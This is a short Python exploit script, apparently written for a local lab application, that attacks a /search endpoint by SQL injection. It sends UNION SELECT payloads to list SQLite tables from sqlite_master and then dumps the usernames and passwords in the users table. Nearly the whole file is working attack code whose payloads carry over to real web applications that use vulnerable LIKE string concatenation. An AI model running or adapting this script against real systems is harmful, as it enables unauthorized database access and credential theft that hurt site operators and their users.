# exploit_sqli.py
# Compact, practical exploit that abuses /search (vulnerable LIKE concat) to extract table names
# and dump the `users` table using UNION + group_concat in SQLite.
import requests
import urllib.parse
import sys

BASE = 'http://127.0.0.1:5000'
SEARCH = BASE + '/search'

def send(q):
    r = requests.get(SEARCH, params={'q': q})
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, r.text

def leak_tables():
    # We know products SELECT returns 3 columns: id, name, description
    # So we craft a UNION SELECT with 3 columns. We put our data into the `name` column.
    payload = "' UNION SELECT 1, group_concat(name, ';'), 3 FROM sqlite_master WHERE type='table' -- "
    code, data = send(payload)
    print('\n[+] HTTP', code)
    print('[+] JSON response (first rows):', data)
    # Parse any name fields returned
    try:
        names = []
        for row in data:
            if row.get('name'):
                names.append(row.get('name'))
        joined = ';'.join(names)
        print('\n[+] Leaked table-names string:', joined)
        return joined
    except Exception as e:
        print('[-] Failed to parse response:', e)
        return ''

def dump_users():
    payload = "' UNION SELECT 1, group_concat(username || ':' || password, ';'), 3 FROM users -- "
    code, data = send(payload)
    print('\n[+] HTTP', code)
    print('[+] Dump response:', data)
    try:
        outs = [r.get('name') for r in data if r.get('name')]
        print('\n[+] Users dump:', outs)
    except Exception as e:
        print('[-] parse failed', e)

if __name__ == '__main__':
    print('[*] Leaking tables via /search')
    tables = leak_tables()
    if 'users' in tables:
        print('[*] Found users table, dumping...')
        dump_users()
    else:
        print('[!] users table not found in leak. Full leak:', tables)
